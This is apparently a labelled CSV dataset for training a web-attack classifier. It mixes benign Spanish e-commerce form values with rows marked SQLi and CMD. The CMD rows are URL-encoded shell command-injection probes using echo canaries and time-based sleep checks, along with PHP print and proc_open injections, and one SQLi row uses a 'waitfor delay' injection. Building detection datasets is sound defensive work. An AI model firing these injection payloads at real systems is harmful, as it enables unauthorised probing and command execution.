payload,label,source
%3B%20str%3D%24%28echo%20PMPVHC%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,CMD,seclists_cmd
'|echo%20TRMWWT$((44%2B53))$(echo%20TRMWWT)TRMWWT,CMD,seclists_cmd
muchow,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
sysint9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%204%20-ne%20%24%28echo%20PDVEEQ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,CMD,seclists_cmd
89A0DC788319A4CFD75B6C5FEE7D4369,Normal,csic_gsi:cisc_normalTraffic_test.txt
"Calle+Jaen+186,+8H",Normal,csic_gsi:cisc_normalTraffic_train.txt
82751097H,Normal,csic_gsi:cisc_normalTraffic_train.txt
DD6BCF91B811BD5C9CBCDA3DDF3BD5CE,Normal,csic_gsi:cisc_normalTraffic_test.txt
2B357CD74B52CDFA2115A2A37E58AC2F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1ojador,Normal,csic_gsi:cisc_normalTraffic_train.txt
"modo=registro&login=dement&password=re681g48rDiA&nombre=Iber&apellidos=Masferr�+Massan�s&email=swingler@stainless.st&dni=52438346W&direccion=Calle+Del+Mercat,+153,+7E&ciudad=Eslava&cp=10335&provincia=Ja�n&ntc=9974650930559392&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
;echo$IFSGBSBJK$((78%2B77))$(echo$IFSGBSBJK)GBSBJK,CMD,seclists_cmd
8D5B9DAF798B2D0B8511F0F2762DD0F9,Normal,csic_gsi:cisc_normalTraffic_test.txt
B241F732E8A2D35706B47FC87E1F5434,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20QHSDUY%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%208%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,CMD,seclists_cmd
Celso,Normal,csic_gsi:cisc_normalTraffic_train.txt
Bail�n,Normal,csic_gsi:cisc_normalTraffic_train.txt
05146%3F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9E22DAC7EAF3934415BFF2CAAC6243D4,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=zolly&pwd=i-ns�pido&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
"""||echo$IFSTCCUHM$((72%2B61))$(echo$IFSTCCUHM)TCCUHM//",CMD,seclists_cmd
AAD73A1242B2928328AFF141926598F1,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%208%20-ne%20%24%28echo%20TNSRYS%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%5C%5C,CMD,seclists_cmd
bisaRma,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20DMZPTC%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,CMD,seclists_cmd
Amores+Montiel,Normal,csic_gsi:cisc_normalTraffic_test.txt
9814CA6B8C9E3F15651486CCE1EF3788,Normal,csic_gsi:cisc_normalTraffic_test.txt
F07B53E9834A46B98EEA54B78F85801F,Normal,csic_gsi:cisc_normalTraffic_train.txt
schafer,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
13570261P,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Ametlla+de+Mar,+L'",Normal,csic_gsi:cisc_normalTraffic_train.txt
echo%20TWRCSC$((11%2B79))$(echo%20TWRCSC)TWRCSC%27,CMD,seclists_cmd
%2522%0A%20str%3D%24%28echo%20VOOIFO%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F,CMD,seclists_cmd
1D3990CDF8572EB7B3E7A5685F9BCDBA,Normal,csic_gsi:cisc_normalTraffic_train.txt
s074ido3,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%205%20-ne%20%24%28echo%20RBBJAR%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,CMD,seclists_cmd
modo=insertar&precio=9334&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20TMPVMS%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2522,CMD,seclists_cmd
"modo=registro&login=shripad&password=fe4r3f39a&nombre=Arm�n&apellidos=Naruto+Boije&email=anaya.priest@pavimentosalagon.ag&dni=27281733F&direccion=Calle+Padre+Aramburu,+33+&ciudad=B�scara&cp=11360&provincia=M�laga&ntc=5284704500425375&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
bourget,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%201%20-ne%20%24%28echo%20QPUCUQ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,CMD,seclists_cmd
${proc_open(print(`echo%20EALLNU`.`echo%20$((18%2B91))`.`echo%20EALLNU`.`echo%20EALLNU`)%29%7DEALLNU,CMD,seclists_cmd
EB48E4786157EEAD3ED3C23248C22F84,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&loginA=lutz&pwd=OpimA&remember=off&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4551401932172135,Normal,csic_gsi:cisc_normalTraffic_train.txt
04A73BD4B7D1DFABC20E933027D08510,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Parla,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%7C%20%5B%204%20-ne%20%24%28echo%20JUHLQP%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,CMD,seclists_cmd
hassall@007tv.nf,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A6F133CA41502489B1FA8D0A60475025,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
17AFF54C1A695D03754988A2FC91AC5C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1657191621298298,Normal,csic_gsi:cisc_normalTraffic_train.txt
7E640A44C01C0E0D82F9420B2512E251,Normal,csic_gsi:cisc_normalTraffic_test.txt
C33BE8936BB75731B11F8759140F1D38,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=7646&B1A=Confirmar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%203%20-ne%20%24%28echo%20FPMDOL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
6F29AF91EBD7295B5DC9ACA0111BB3C4,Normal,csic_gsi:cisc_normalTraffic_test.txt
mutsuo,Normal,csic_gsi:cisc_normalTraffic_test.txt
phillie,Normal,csic_gsi:cisc_normalTraffic_test.txt
BEbeDIZo,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%7Cecho%20EUMDZA$((75%2B60))$(echo%20EUMDZA)EUMDZA\,CMD,seclists_cmd
71DD0EF28B4F704AC7C25C3A1D180C3B,Normal,csic_gsi:cisc_normalTraffic_train.txt
4B5D87BA1D0D5BC085A7401311EDD165,Normal,csic_gsi:cisc_normalTraffic_test.txt
1693400782786511,Normal,csic_gsi:cisc_normalTraffic_test.txt
6BF9C66AC375F15758C41C8CB42517EC,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3E4C76EC53DFE27E5C6A994BB018095F,Normal,csic_gsi:cisc_normalTraffic_train.txt
138B69C4F779CC49A2967D170ECDB18D,Normal,csic_gsi:cisc_normalTraffic_train.txt
FCA6221EBCFD4C6875F885E85EB3ACA4,Normal,csic_gsi:cisc_normalTraffic_train.txt
7354033A19CB9A7B1FEA577DE574E836,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%3B%20str%3D%24%28echo%20DJSHTX%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F,CMD,seclists_cmd
CF3CCA2AA28FA92731A7BCA1F23BD5DD,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
A8875EE1E21026A04CF63102D7EA2666,Normal,csic_gsi:cisc_normalTraffic_test.txt
echo%20LBGSCB$((75%2B53))$(echo%20LBGSCB)LBGSCB&,CMD,seclists_cmd
Temistocles,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'%0aecho%20EIOCXK$((27%2B80))$(echo%20EIOCXK)EIOCXK,CMD,seclists_cmd
7AE7FA6E026C135AB64CF3BB3491076D,Normal,csic_gsi:cisc_normalTraffic_train.txt
D65AC88460F15DCFD7C319DCA6652F3E,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20KEZMWT%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C,CMD,seclists_cmd
vieiro,Normal,csic_gsi:cisc_normalTraffic_test.txt
328F494E7AA83C6F7829E7D0A6250F7A,Normal,csic_gsi:cisc_normalTraffic_train.txt
"8,if�c6l",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Alaiz+Valiente,Normal,csic_gsi:cisc_normalTraffic_test.txt
09471,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4E3A3CE26EFEACE6427C593DA669588C,Normal,csic_gsi:cisc_normalTraffic_test.txt
B110D19F2355E9FC9CF9EF7740980A7E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C66E564D9D2E717DE96563DFCDCB1A00,Normal,csic_gsi:cisc_normalTraffic_test.txt
57C39622460EEF6D74D427AB54422931,Normal,csic_gsi:cisc_normalTraffic_train.txt
643E53B36DEFFAFBD97ACBC096DEBA32,Normal,csic_gsi:cisc_normalTraffic_test.txt
B0068EA3F8D0A57CB57752B79467B3E7,Normal,csic_gsi:cisc_normalTraffic_test.txt
1812BF27A1C9E76FDE9755D5ECC94145,Normal,csic_gsi:cisc_normalTraffic_train.txt
89B7AEBF74D8C67DB0203B1233962BD9,Normal,csic_gsi:cisc_normalTraffic_test.txt
3ECD617061D9FB70E5BA4F9114F08620,Normal,csic_gsi:cisc_normalTraffic_test.txt
4167,Normal,csic_gsi:cisc_normalTraffic_test.txt
"2','0','0','0','0');waitfor+delay+'0:0:15';--",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
""");}print(`echo%20KHRTRY`.`echo%20$((68%2B68))`.`echo%20KHRTRY`.`echo%20KHRTRY`)%3B//KHRTRY",CMD,seclists_cmd
DB757E72E922DAC35B3803034DAB074E,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C8F21DFFFAEDE408817CC78EFA17F777,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=bonnar&password=perillana&nombre=Benito&apellidos=Estruga+Barrozzi&email=offerall@eonon.com.ci&dni=78627299M&direccion=Poetisa+Rosalia+De+Castro,+41,+3?E&ciudad=Valhermoso+de+la+Fuente&cp=24174&provinciaA=Cuenca&ntc=3588478670456559&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20KJFZDM%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%202%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%255C%255C,CMD,seclists_cmd
DDFF099562A4A6D1C37499CA77697FC3,Normal,csic_gsi:cisc_normalTraffic_test.txt
DBA29AFA90CB3B14EE286A2EE667A435,Normal,csic_gsi:cisc_normalTraffic_train.txt
3E01D6060D81703EF684B14D8CC4E3FC,Normal,csic_gsi:cisc_normalTraffic_test.txt
Gomesende,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
10207822P,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
19420,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
de7hebillar,Normal,csic_gsi:cisc_normalTraffic_test.txt
Plasenzuela,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
82332840Q,Normal,csic_gsi:cisc_normalTraffic_train.txt
FEE03F6A120AA2E2BA332286A56040A7,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5B%207%20-ne%20%24%28echo%20MNLBVU%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,seclists_cmd
%3B%20str%3D%24%28echo%20POHUXH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23,CMD,seclists_cmd
Gamb�s+Galatioto,Normal,csic_gsi:cisc_normalTraffic_train.txt
BUlliciosO,Normal,csic_gsi:cisc_normalTraffic_train.txt
632CB86C2FE242A47465CE1F2E80A2AE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"""%0aecho$IFSDWMULK$((25%2B34))$(echo$IFSDWMULK)DWMULK",CMD,seclists_cmd
D8075F50B41F131676432EEC0F617360,Normal,csic_gsi:cisc_normalTraffic_test.txt
7953A07BE981A3FE2936F30861808001,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
pertrech8r,Normal,csic_gsi:cisc_normalTraffic_test.txt
4FB0FBE9142CB2C882C517CBF04DA042,Normal,csic_gsi:cisc_normalTraffic_test.txt
E5A4A53A9BAEEE3330CAB2D810BEB302,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%3B%20str%3D%24%28echo%20NBAQGO%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,CMD,seclists_cmd
%0A%20str%3D%24%28echo%20EGTDDG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20UFTNKA%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23,CMD,seclists_cmd
D9DE85281631D31B05F29A166281ABE8,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Don+Ferreol+Hernandez+S/N,+",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&nombre=Vino+Rioja&precioA=85&cantidad=50&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
srirupa0,Normal,csic_gsi:cisc_normalTraffic_test.txt
brooksba,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Elio+Ca�ella,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Florit+Tobella,Normal,csic_gsi:cisc_normalTraffic_test.txt
26A1401F19A6A8A774A2DB4D1C71CCF3,Normal,csic_gsi:cisc_normalTraffic_test.txt
720F87913411645AD4E3C227045F0DCB,Normal,csic_gsi:cisc_normalTraffic_test.txt
meany,Normal,csic_gsi:cisc_normalTraffic_test.txt
AD3CD846607EC172D22561D7A1175575,Normal,csic_gsi:cisc_normalTraffic_train.txt
tabina,Normal,csic_gsi:cisc_normalTraffic_test.txt
"""&echo%20CCWSNS$((52%2B72))$(echo%20CCWSNS)CCWSNS|",CMD,seclists_cmd
4A8B2FFE69EB466FFAEA83FDFA3DE15C,Normal,csic_gsi:cisc_normalTraffic_test.txt
winsberg,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
52C5AC4CE95715B6B520AD86E588C4B3,Normal,csic_gsi:cisc_normalTraffic_test.txt
208F81CDF127645703FFEE67F9BF011B,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%207%20-ne%20%24%28echo%20CSMWFN%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,seclists_cmd
846D0484F9211A47F01836B14A179F57,Normal,csic_gsi:cisc_normalTraffic_train.txt
72620654V,Normal,csic_gsi:cisc_normalTraffic_train.txt
2F09132A806C25A3E8DAF09E4F37AA9F,Normal,csic_gsi:cisc_normalTraffic_train.txt
4344811902014577,Normal,csic_gsi:cisc_normalTraffic_train.txt
F64235C236C4214B17614558615164B2,Normal,csic_gsi:cisc_normalTraffic_train.txt
CEC7F4D7C0DCDCDD8BD40952B6956E80,Normal,csic_gsi:cisc_normalTraffic_test.txt
DE7F7E85B8A0894EB78DF30B000CE898,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=5548&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_test.txt
2F525CC00B0E199559458D4673781B8C,Normal,csic_gsi:cisc_normalTraffic_train.txt
F68D67A9FFD913E55FA7376D4371E0B8,Normal,csic_gsi:cisc_normalTraffic_test.txt
AD3B49D003E282AFB812C282ECC31143,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3DA83EB6CC4BE0C323F6E49D25D74705,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C41ACDA03D843556BA08EF9DEEB99BCC,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C/+San+Pascual+Bailon+142+2?F,Normal,csic_gsi:cisc_normalTraffic_test.txt
8795932127CAB2075F9C4E3C199B7A02,Normal,csic_gsi:cisc_normalTraffic_test.txt
83217349Z,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20TSUCKA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22,CMD,seclists_cmd
%26%26echo%20KSNQJR$((81%2B61))$(echo%20KSNQJR)KSNQJR,CMD,seclists_cmd
Muntan�+Pros,Normal,csic_gsi:cisc_normalTraffic_train.txt
8F13D86A1D66F130667C2D45A685795A,Normal,csic_gsi:cisc_normalTraffic_test.txt
548FD65728AC1A4C1F0E6E449112BB1B,Normal,csic_gsi:cisc_normalTraffic_train.txt
0D8331575EC1CF2D41ED0471BF1384D4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
859D2CD1BBEBCD7B3414E701726620D7,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Brzozowski,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7233074673083306,Normal,csic_gsi:cisc_normalTraffic_test.txt
90993097Z,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
BF976365EFEF3CA7E5FA97AE5B187E14,Normal,csic_gsi:cisc_normalTraffic_test.txt
ABC2FA5BF0C8A9B6B525455AFDF4D04D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"Calle+Gui�ol+79,+10?C",Normal,csic_gsi:cisc_normalTraffic_train.txt
3BAC3DD578397920E38122660C64BC86,Normal,csic_gsi:cisc_normalTraffic_train.txt
8E99D4B534F8FE0627BD19B1201AB228,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=2&nombre=Vino+Rioja&precio=100&cantidad=48&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_train.txt
heunis,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Natale,Normal,csic_gsi:cisc_normalTraffic_test.txt
matterstock@9horas.np,Normal,csic_gsi:cisc_normalTraffic_train.txt
8101F855C7C3EF4F23EE02AF37DC2892,Normal,csic_gsi:cisc_normalTraffic_test.txt
C6F84CE238F90443E986A911BDFEBBAD,Normal,csic_gsi:cisc_normalTraffic_test.txt
68FE7C7CD10700C5AFF6A0FD890FECFC,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20JGUTOJ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26,CMD,seclists_cmd
44143,Normal,csic_gsi:cisc_normalTraffic_train.txt
schiaftino@showenvivo.com.sy,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
emmeline4,Normal,csic_gsi:cisc_normalTraffic_test.txt
1D3F58F5502123387BC24A7CA8EB1F2F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
7F130CB20003E465C5676207E82EFAF8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
AA355C9413F960CDE665731BF2A478CB,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=hills&pwd=desamueblar&remember=off&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%7Cecho$IFSOQAOQJ$((62%2B26))$(echo$IFSOQAOQJ)OQAOQJ%27,CMD,seclists_cmd
Pelegay+Martinho,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%0A%20str%3D%24%28echo%20NWELWC%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20,CMD,seclists_cmd
8E6AD3F3A105D4F318E5EA5F348F4FEB,Normal,csic_gsi:cisc_normalTraffic_train.txt
C8B327B93D1204CF3D7BA74D233F71A2,Normal,csic_gsi:cisc_normalTraffic_test.txt
4DE7E9106C517F1A88CC649D507D6A87,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=registro&login=torie&password=f6n3abl4&nombre=Tito&apellidos=Baquerizo+Amatll�&email=massie.borionko@13horas.gr&dni=96312323F&direccion=C/+Emile+Robin+194+9?H&ciudad=Salinas+de+Oro&cp=26241&provincia=Toledo&ntc=4336085166451274&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
%3B%20str%3D%24%28echo%20EWCHCT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%26,CMD,seclists_cmd
5AF079F94B92BD9FFD34270D894C2727,Normal,csic_gsi:cisc_normalTraffic_train.txt
679646557157740,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=entrar&login=boothe&pwd=artista&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=bobbie7%2B&pwd=8r126ec2o&remember=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=registro&login=druci&password=exCusaNa&nombre=Pamina&apellidos=Marrocchi&email=laplat@granadapromueve.cx&dni=49653086L&direccion=Calle+Rioja+147+&ciudad=Argamasilla+de+Alba&cp=22991&provincia=La+Rioja&ntc=3572857528910134&B1=Registrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
C25EB5B45A80BA531B692B187D9906F1,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
5C47B492E10B177FAC7EF8E284EF2DA8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
09086E687C7D79D1FC20BDCA310D045C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
DE92FD7866672ABD312E356C9EE9A5B8,Normal,csic_gsi:cisc_normalTraffic_train.txt
73066A6FE0CD37A0AB71BDE297E07986,Normal,csic_gsi:cisc_normalTraffic_test.txt
Alexis,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
BibL7o718a24o,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
""")print(`echo%20ATRPAE;echo%20$((77%2B72));echo%20ATRPAE;echo%20ATRPAE`)%3B%255C%255CATRPAE",CMD,seclists_cmd
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20USNHDT%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%22,CMD,seclists_cmd
p5der,Normal,csic_gsi:cisc_normalTraffic_test.txt
8C00D1EC04D98C95CE7A421A94FB669D,Normal,csic_gsi:cisc_normalTraffic_train.txt
"""&echo$IFSFNFBIK$((62%2B22))$(echo$IFSFNFBIK)FNFBIK%22",CMD,seclists_cmd
modo=entrar&login=terangue&pwd=potrear&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
A3CCB9C634B6677C66448C31D5744736,Normal,csic_gsi:cisc_normalTraffic_test.txt
covan-giftos@monnal.so,Normal,csic_gsi:cisc_normalTraffic_test.txt
ADEC678B42040F4158FEAF26DFCE6C4E,Normal,csic_gsi:cisc_normalTraffic_test.txt
48B76D7103A898F6273B1691B52BB6B5,Normal,csic_gsi:cisc_normalTraffic_test.txt
3BD874CE162E81CD3F4110C299F3EC10,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%0A%20str%3D%24%28echo%20JLTOOU%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26,CMD,seclists_cmd
9335,Normal,csic_gsi:cisc_normalTraffic_test.txt
A5C877BCF36E2146D4489FFE1D2C611F,Normal,csic_gsi:cisc_normalTraffic_test.txt
'%7Cecho%20CFOPSJ$((27%2B97))$(echo%20CFOPSJ)CFOPSJ',CMD,seclists_cmd
718D85D78E74487CFD11C893825CF8A6,Normal,csic_gsi:cisc_normalTraffic_train.txt
54B0C20606B415C10AF09DCB69F4D9B7,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20GNKPOL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%22,CMD,seclists_cmd
0EFDF222221EA89DDB03337873B53712,Normal,csic_gsi:cisc_normalTraffic_test.txt
A3E4E6B2BCCEA198B8F6E9E404AEF21A,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20IXZJDX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%5C%5C,CMD,seclists_cmd
FDF3FE89D00655BB851FAA1B31358B6E,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%3B%20str%3D%24%28echo%20LMZYDH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%255C%255C,CMD,seclists_cmd
');}print(`echo%20EVHTLK\necho%20$((99%2B40))\necho%20EVHTLK\necho%20EVHTLK`)%3B//EVHTLK,CMD,seclists_cmd
C36002D358B755CF043511513F6A8AAB,Normal,csic_gsi:cisc_normalTraffic_test.txt
7A53D48EDB306510132FC30849F85A08,Normal,csic_gsi:cisc_normalTraffic_train.txt
